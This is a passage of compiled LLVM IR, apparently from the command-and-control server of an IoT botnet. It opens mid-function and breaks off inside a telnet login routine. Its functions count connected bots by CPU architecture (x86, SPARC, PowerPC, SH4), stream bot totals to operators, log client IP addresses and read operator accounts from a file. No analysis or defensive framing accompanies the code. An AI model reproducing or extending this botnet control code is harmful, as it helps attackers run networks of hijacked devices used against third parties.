  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !17

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @x86Connected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !18

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @spcConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !19

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @ppcConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 5
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !20

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sh4Connected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 6
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !21

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 7
  %11 = load i8, i8* %10, align 2
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !22

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i64
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* %3, align 4
  br label %8

8:                                                ; preds = %1, %21
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %9, i8 0, i64 2048, i1 false)
  %10 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %11 = call i32 @clientsConnected()
  %12 = load volatile i32, i32* @managesConnected, align 4
  %13 = call i32 (i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.21, i64 0, i64 0), i32 27, i32 %11, i32 %12, i32 7) #8
  %14 = load i32, i32* %3, align 4
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %17 = call i64 @strlen(i8* %16) #9
  %18 = call i64 @send(i32 %14, i8* %15, i64 %17, i32 16384)
  %19 = icmp eq i64 %18, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %8
  br label %21

21:                                               ; preds = %20, %8
  %22 = call i32 @sleep(i32 2)
  br label %8
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Search_in_File(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #9
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !23

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @client_addr(i64 %0, i64 %1) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 0
  store i64 %0, i64* %6, align 4
  %7 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 1
  store i64 %1, i64* %7, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %9 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 4
  %11 = and i32 %10, 255
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %13 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = and i32 %14, 65280
  %16 = lshr i32 %15, 8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %19 = load i32, i32* %18, align 4
  %20 = and i32 %19, 16711680
  %21 = lshr i32 %20, 16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 4
  %25 = and i32 %24, -16777216
  %26 = lshr i32 %25, 24
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.24, i64 0, i64 0), i32 %11, i32 %16, i32 %21, i32 %26)
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** %4, align 8
  %29 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %31 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = and i32 %32, 255
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %35 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  %37 = and i32 %36, 65280
  %38 = lshr i32 %37, 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %40 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %39, i32 0, i32 0
  %41 = load i32, i32* %40, align 4
  %42 = and i32 %41, 16711680
  %43 = lshr i32 %42, 16
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, -16777216
  %48 = lshr i32 %47, 24
  %49 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.27, i64 0, i64 0), i32 %33, i32 %38, i32 %43, i32 %48)
  %50 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %51 = call i32 @fclose(%struct._IO_FILE* %50)
  ret void
}

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [90000 x i8], align 16
  %19 = alloca [90000 x i8], align 16
  %20 = alloca [90000 x i8], align 16
  %21 = alloca [90000 x i8], align 16
  %22 = alloca [90000 x i8], align 16
  %23 = alloca [90000 x i8], align 16
  %24 = alloca [90000 x i8], align 16
  %25 = alloca [90000 x i8], align 16
  %26 = alloca [90000 x i8], align 16
  %27 = alloca [90000 x i8], align 16
  %28 = alloca [90000 x i8], align 16
  %29 = alloca [90000 x i8], align 16
  %30 = alloca [90000 x i8], align 16
  %31 = alloca [90000 x i8], align 16
  %32 = alloca [90000 x i8], align 16
  %33 = alloca [90000 x i8], align 16
  %34 = alloca [90000 x i8], align 16
  %35 = alloca [90000 x i8], align 16
  %36 = alloca [90000 x i8], align 16
  %37 = alloca [90000 x i8], align 16
  %38 = alloca [90000 x i8], align 16
  %39 = alloca [90000 x i8], align 16
  %40 = alloca [90000 x i8], align 16
  %41 = alloca [128 x i8], align 16
  %42 = alloca [128 x i8], align 16
  %43 = alloca [128 x i8], align 16
  %44 = alloca [128 x i8], align 16
  %45 = alloca [128 x i8], align 16
  %46 = alloca [128 x i8], align 16
  %47 = alloca [128 x i8], align 16
  %48 = alloca [100 x i8*], align 16
  %49 = alloca i8*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca i8*, align 8
  %52 = alloca i8*, align 8
  %53 = alloca [50 x i8*], align 16
  %54 = alloca [5000 x i8], align 16
  %55 = alloca [5000 x i8], align 16
  %56 = alloca [5000 x i8], align 16
  %57 = alloca [5000 x i8], align 16
  %58 = alloca [5000 x i8], align 16
  %59 = alloca [5000 x i8], align 16
  %60 = alloca [5000 x i8], align 16
  %61 = alloca [5000 x i8], align 16
  %62 = alloca [5000 x i8], align 16
  %63 = alloca [5000 x i8], align 16
  %64 = alloca [5000 x i8], align 16
  %65 = alloca [5000 x i8], align 16
  %66 = alloca [5000 x i8], align 16
  %67 = alloca [5000 x i8], align 16
  %68 = alloca [5000 x i8], align 16
  %69 = alloca [5000 x i8], align 16
  %70 = alloca [5000 x i8], align 16
  %71 = alloca [5000 x i8], align 16
  %72 = alloca [5000 x i8], align 16
  %73 = alloca [5000 x i8], align 16
  %74 = alloca [5000 x i8], align 16
  %75 = alloca [5000 x i8], align 16
  %76 = alloca [5000 x i8], align 16
  %77 = alloca [5000 x i8], align 16
  %78 = alloca [5000 x i8], align 16
  %79 = alloca [5000 x i8], align 16
  %80 = alloca [5000 x i8], align 16
  %81 = alloca [5000 x i8], align 16
  %82 = alloca [5000 x i8], align 16
  %83 = alloca [5000 x i8], align 16
  %84 = alloca [5000 x i8], align 16
  %85 = alloca [5000 x i8], align 16
  %86 = alloca [5000 x i8], align 16
  %87 = alloca [5000 x i8], align 16
  %88 = alloca [5000 x i8], align 16
  %89 = alloca [5000 x i8], align 16
  %90 = alloca [5000 x i8], align 16
  %91 = alloca [5000 x i8], align 16
  %92 = alloca [5000 x i8], align 16
  %93 = alloca [5000 x i8], align 16
  %94 = alloca [5000 x i8], align 16
  %95 = alloca [5000 x i8], align 16
  %96 = alloca [5000 x i8], align 16
  %97 = alloca [5000 x i8], align 16
  %98 = alloca [5000 x i8], align 16
  %99 = alloca [5000 x i8], align 16
  %100 = alloca [5000 x i8], align 16
  %101 = alloca [5000 x i8], align 16
  %102 = alloca [5000 x i8], align 16
  %103 = alloca [5000 x i8], align 16
  %104 = alloca [5000 x i8], align 16
  %105 = alloca [5000 x i8], align 16
  %106 = alloca [5000 x i8], align 16
  %107 = alloca [5000 x i8], align 16
  %108 = alloca [5000 x i8], align 16
  %109 = alloca [5000 x i8], align 16
  %110 = alloca [5000 x i8], align 16
  %111 = alloca [5000 x i8], align 16
  %112 = alloca [5000 x i8], align 16
  %113 = alloca [5000 x i8], align 16
  %114 = alloca [5000 x i8], align 16
  %115 = alloca [5000 x i8], align 16
  %116 = alloca [5000 x i8], align 16
  %117 = alloca [5000 x i8], align 16
  %118 = alloca [5000 x i8], align 16
  %119 = alloca [5000 x i8], align 16
  %120 = alloca [5000 x i8], align 16
  %121 = alloca [5000 x i8], align 16
  %122 = alloca [5000 x i8], align 16
  %123 = alloca [5000 x i8], align 16
  %124 = alloca [5000 x i8], align 16
  %125 = alloca [5000 x i8], align 16
  %126 = alloca [5000 x i8], align 16
  %127 = alloca [5000 x i8], align 16
  %128 = alloca [5000 x i8], align 16
  %129 = alloca [5000 x i8], align 16
  %130 = alloca [5000 x i8], align 16
  %131 = alloca [5000 x i8], align 16
  %132 = alloca [5000 x i8], align 16
  %133 = alloca [5000 x i8], align 16
  %134 = alloca [5000 x i8], align 16
  %135 = alloca [5000 x i8], align 16
  %136 = alloca [5000 x i8], align 16
  %137 = alloca [5000 x i8], align 16
  %138 = alloca [5000 x i8], align 16
  %139 = alloca [5000 x i8], align 16
  %140 = alloca [5000 x i8], align 16
  %141 = alloca [5000 x i8], align 16
  %142 = alloca [5000 x i8], align 16
  %143 = alloca [5000 x i8], align 16
  %144 = alloca [5000 x i8], align 16
  %145 = alloca [5000 x i8], align 16
  %146 = alloca [5000 x i8], align 16
  %147 = alloca [5000 x i8], align 16
  %148 = alloca [5000 x i8], align 16
  %149 = alloca [5000 x i8], align 16
  %150 = alloca [5000 x i8], align 16
  %151 = alloca [5000 x i8], align 16
  %152 = alloca [5000 x i8], align 16
  %153 = alloca [5000 x i8], align 16
  %154 = alloca [5000 x i8], align 16
  %155 = alloca [5000 x i8], align 16
  %156 = alloca [5000 x i8], align 16
  %157 = alloca [5000 x i8], align 16
  %158 = alloca [5000 x i8], align 16
  %159 = alloca [5000 x i8], align 16
  %160 = alloca [5000 x i8], align 16
  %161 = alloca [5000 x i8], align 16
  %162 = alloca [5000 x i8], align 16
  %163 = alloca [5000 x i8], align 16
  %164 = alloca [5000 x i8], align 16
  %165 = alloca [5000 x i8], align 16
  %166 = alloca [5000 x i8], align 16
  %167 = alloca %struct._IO_FILE*, align 8
  %168 = alloca %struct._IO_FILE*, align 8
  %169 = alloca %struct._IO_FILE*, align 8
  %170 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %171 = load i8*, i8** %3, align 8
  %172 = ptrtoint i8* %171 to i32
  store i32 %172, i32* %4, align 4
  %173 = load volatile i32, i32* @managesConnected, align 4
  %174 = add nsw i32 %173, 1
  store volatile i32 %174, i32* @managesConnected, align 4
  %175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %175, i8 0, i64 2048, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i64 0, i64 0), i8** %12, align 8
  %176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %176, i8 0, i64 2048, i1 false)
  %177 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %177, i8 0, i64 2048, i1 false)
  store i32 0, i32* %15, align 4
  %178 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i64 0, i64 0))
  store %struct._IO_FILE* %178, %struct._IO_FILE** %14, align 8
  br label %179

179:                                              ; preds = %184, %1
  %180 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %181 = call i32 @feof(%struct._IO_FILE* %180) #8
  %182 = icmp ne i32 %181, 0
  %183 = xor i1 %182, true
  br i1 %183, label %184, label %189

184:                                              ; preds = %179
  %185 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %186 = call i32 @fgetc(%struct._IO_FILE* %185)
  store i32 %186, i32* %16, align 4
  %187 = load i32, i32* %15, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %15, align 4
  br label %179, !llvm.loop !24

189:                                              ; preds = %179
  store i32 0, i32* %17, align 4
  %190 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* %190)
  br label %191

191:                                              ; preds = %196, %189
  %192 = load i32, i32* %17, align 4
  %193 = load i32, i32* %15, align 4
  %194 = sub nsw i32 %193, 1
  %195 = icmp ne i32 %192, %194
  br i1 %195, label %196, label %216

196:                                              ; preds = %191
  %197 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %198 = load i32, i32* %17, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %199
  %201 = getelementptr inbounds %struct.account, %struct.account* %200, i32 0, i32 0
  %202 = getelementptr inbounds [200 x i8], [200 x i8]* %201, i64 0, i64 0
  %203 = load i32, i32* %17, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %204
  %206 = getelementptr inbounds %struct.account, %struct.account* %205, i32 0, i32 1
  %207 = getelementptr inbounds [200 x i8], [200 x i8]* %206, i64 0, i64 0
  %208 = load i32, i32* %17, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %209
  %211 = getelementptr inbounds %struct.account, %struct.account* %210, i32 0, i32 2
  %212 = getelementptr inbounds [200 x i8], [200 x i8]* %211, i64 0, i64 0
  %213 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %197, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i64 0, i64 0), i8* %202, i8* %207, i8* %212)
  %214 = load i32, i32* %17, align 4
  %215 = add nsw i32 %214, 1
  store i32 %215, i32* %17, align 4
  br label %191, !llvm.loop !25

216:                                              ; preds = %191
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %218 = call i32 (i8*, i8*, ...) @sprintf(i8* %217, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.30, i64 0, i64 0)) #8
  %219 = load i32, i32* %4, align 4
  %220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %222 = call i64 @strlen(i8* %221) #9
  %223 = call i64 @send(i32 %219, i8* %220, i64 %222, i32 16384)
  %224 = icmp eq i64 %223, -1
  br i1 %224, label %225, label %226

225:                                              ; preds = %216
  br label %2807

226:                                              ; preds = %216
  %227 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %228 = load i32, i32* %4, align 4
  %229 = call i32 @fdgets(i8* %227, i32 2048, i32 %228)
  %230 = icmp slt i32 %229, 1
  br i1 %230, label %231, label %232

231:                                              ; preds = %226
  br label %2807

232:                                              ; preds = %226
  %233 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* %233)
  %234 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i64 0, i64 0
  %235 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %236 = call i32 (i8*, i8*, ...) @sprintf(i8* %234, i8* %235) #8
  %237 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  store i8* %237, i8** %9, align 8
  %238 = load i8*, i8** %9, align 8
  %239 = call i32 @Search_in_File(i8* %238)
  store i32 %239, i32* %5, align 4
  %240 = load i8*, i8** %9, align 8
  %241 = load i32, i32* %5, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %242
  %244 = getelementptr inbounds %struct.account, %struct.account* %243, i32 0, i32 0
  %245 = getelementptr inbounds [200 x i8], [200 x i8]* %244, i64 0, i64 0
  %246 = call i32 @strcmp(i8* %240, i8* %245) #9
  %247 = icmp eq i32 %246, 0
  br i1 %247, label %248, label %277

248:                                              ; preds = %232
  %249 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %250 = call i32 (i8*, i8*, ...) @sprintf(i8* %249, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.32, i64 0, i64 0)) #8
  %251 = load i32, i32* %4, align 4
  %252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %254 = call i64 @strlen(i8* %253) #9
  %255 = call i64 @send(i32 %251, i8* %252, i64 %254, i32 16384)
  %256 = icmp eq i64 %255, -1
  br i1 %256, label %257, label %258

257:                                              ; preds = %248
  br label %2807

258:                                              ; preds = %248
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %260 = load i32, i32* %4, align 4
  %261 = call i32 @fdgets(i8* %259, i32 2048, i32 %260)
  %262 = icmp slt i32 %261, 1
  br i1 %262, label %263, label %264

263:                                              ; preds = %258
  br label %2807

264:                                              ; preds = %258
  %265 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* %265)
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %267 = load i32, i32* %5, align 4
  %268 = sext i32 %267 to i64
